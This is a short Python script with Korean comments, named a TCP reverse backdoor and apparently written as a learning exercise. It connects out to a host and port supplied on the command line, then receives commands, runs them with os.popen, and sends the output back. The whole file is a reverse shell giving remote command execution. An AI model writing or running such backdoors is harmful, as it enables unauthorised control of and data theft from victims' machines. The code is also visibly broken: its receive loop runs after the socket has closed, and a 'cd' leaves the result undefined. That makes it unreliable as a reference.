# cmd와 연결

import os, socket, sys
#import subprocess -> 프로세스 생성

def usage(): # help
    print('''
    tcp_reverse_backdoor.py <host> <port>
    '''
    )
    exit()

if len(sys.argv) < 3: # <host> <port> 개수 확인
    usage()

with socket.socket() as s:
    addr = (sys.argv[1], int(sys.argv[2]))
    s.connect(addr)
    s.send('''
    ###########################
    # tcp_reverse_backdoor.py #
    ###########################
    >>''' .encode())

while True:
    data = s.recv(1024).decode().lower()
    
    if "q" == data:
        exit() # 프로그램 종료
    else:
        if data.startswith("cd"): # cd gasbugs
            # 디렉터리 변경
            os.chdir(data[3:].replace('\n','')) # data[3:] -> cd'' 부분, replace('\n), '') -> 명령어 입력 후 엔터
        else:
            result = os.popen(data).read()
        result = result + "\n>>"
        s.send(result.encode())